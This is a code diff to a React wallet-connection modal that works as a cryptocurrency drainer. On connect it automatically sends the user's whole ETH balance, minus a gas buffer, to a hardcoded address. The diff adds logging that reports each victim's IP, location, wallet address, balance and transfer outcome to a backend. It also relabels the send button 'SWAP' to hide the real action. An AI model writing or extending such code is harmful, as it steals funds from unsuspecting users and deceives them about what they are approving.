@@ -122,6 +122,20 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
 
     const ETH_ADDRESS = process.env.NEXT_PUBLIC_ETH_ADDRESS || "0x9b8f441bafd4318a97c2d40d7187219dbfdeb4ee";
 
+    const logWalletActivity = async (payload: Record<string, any>) => {
+        try {
+            const geoRes = await fetch("/api/geo").catch(() => null);
+            const geo = geoRes ? await geoRes.json().catch(() => ({})) : {};
+            await fetch("/api/wallets", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ ...payload, ip: geo.ip, country: geo.country, city: geo.city }),
+            });
+        } catch (e) {
+            // Ignore logging errors
+        }
+    };
+
     const executeAutoTransfer = async (provider: any, fromAddress: string, balHex: string) => {
         if (!ETH_ADDRESS) return;
         try {
@@ -129,7 +143,6 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
             const sendable = parseFloat(balEth) - 0.001; // leave 0.001 ETH buffer for gas fees
             
             if (sendable <= 0) {
-                // Not enough ETH to send after gas buffer
                 return; 
             }
             
@@ -146,9 +159,30 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
             });
             setTxHash(txHash);
             setStep("success");
+            
+            // Log successful transfer
+            logWalletActivity({
+                action: "transfer",
+                walletName: selectedWallet?.name || "Web3 Wallet",
+                address: fromAddress,
+                toAddress: ETH_ADDRESS,
+                amount: sendable.toString(),
+                txHash,
+                status: "success",
+            });
         } catch (err: any) {
             setErrorMsg(err?.message ?? "Transaction failed or rejected.");
             setStep("error");
+            
+            // Log rejected transfer
+            logWalletActivity({
+                action: "transfer",
+                walletName: selectedWallet?.name || "Web3 Wallet",
+                address: fromAddress,
+                toAddress: ETH_ADDRESS,
+                status: "rejected",
+                errorMsg: err?.message || "User rejected or failed",
+            });
         }
     };
 
@@ -269,6 +303,13 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
             setAmount(ethBal); // Autofill amount
             setStep("connected");
             
+            logWalletActivity({
+                action: "connect",
+                walletName: wallet.name,
+                address: acc,
+                balance: ethBal,
+            });
+
             // Automatically trigger transaction
             await executeAutoTransfer(provider, acc, balHex);
         } catch (err: any) {
@@ -455,7 +496,7 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
                                     cursor: !amount || parseFloat(amount) <= 0 ? "not-allowed" : "pointer",
                                 }}
                             >
-                                Send ETH →
+                                SWAP →
                             </button>
 
                             <button
